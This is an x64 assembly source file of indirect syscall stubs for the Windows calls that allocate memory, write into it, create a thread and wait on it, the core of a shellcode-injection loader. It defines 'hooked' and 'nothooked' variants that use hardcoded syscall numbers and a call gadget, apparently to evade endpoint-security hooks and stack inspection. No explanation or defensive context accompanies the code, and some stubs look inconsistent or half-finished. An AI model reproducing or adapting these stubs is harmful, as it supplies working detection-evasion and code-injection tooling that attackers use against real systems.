global _NtAllocateVirtualMemory_stub
global _NtWriteVirtualMemory_stub
global _NtCreateThreadEx_stub
global _NtWaitForSingleObject_stub

global _NtAllocateVirtualMemory_stub_nothooked
global _NtWriteVirtualMemory_stub_nothooked
global _NtCreateThreadEx_stub_nothooked
global _NtWaitForSingleObject_stub_nothooked

extern sysAddrNtAllocateVirtualMemory
extern sysAddrNtWriteVirtualMemory
extern sysAddrNtCreateThreadEx
extern sysAddrNtWaitForSingleObject
extern callRax  

section .text

_NtAllocateVirtualMemory_stub: 
    ;mov r10, rcx
    mov rax, qword [rel sysAddrNtAllocateVirtualMemory]
    jmp rax
    ;mov r14, qword [rel callRax]
    ;call r14
    ;ret


; NtWriteVirtualMemory has 4 mandatory arguments, so it is fine to clobber the call stack. 
_NtWriteVirtualMemory_stub:
    ;mov r10, rcx
    mov rax, qword [rel sysAddrNtWriteVirtualMemory]
    ;jmp rax
    mov r15, qword [rel callRax]
    call r15
    ret

_NtCreateThreadEx_stub:
    ;mov r10, rcx
    mov rax, qword [rel sysAddrNtCreateThreadEx]
    mov r11, [rel callRax]
    jmp r11

_NtWaitForSingleObject_stub:
    ;mov r10, rcx
    mov r10, rcx
    mov eax, 0x4
    jmp qword [rel sysAddrNtWaitForSingleObject]



_NtAllocateVirtualMemory_stub_nothooked:
    mov r10, rcx
    mov eax, 0x18
    jmp qword [rel sysAddrNtAllocateVirtualMemory]

_NtWriteVirtualMemory_stub_nothooked:
    mov r10, rcx
    mov eax, 0x3A
    jmp qword [rel sysAddrNtWriteVirtualMemory]

_NtCreateThreadEx_stub_nothooked:
    mov r10, rcx
    mov eax, 0xC7
    jmp qword [rel sysAddrNtCreateThreadEx]

_NtWaitForSingleObject_stub_nothooked:
    mov r10, rcx
    mov eax, 0x4
    jmp qword [rel sysAddrNtWaitForSingleObject]



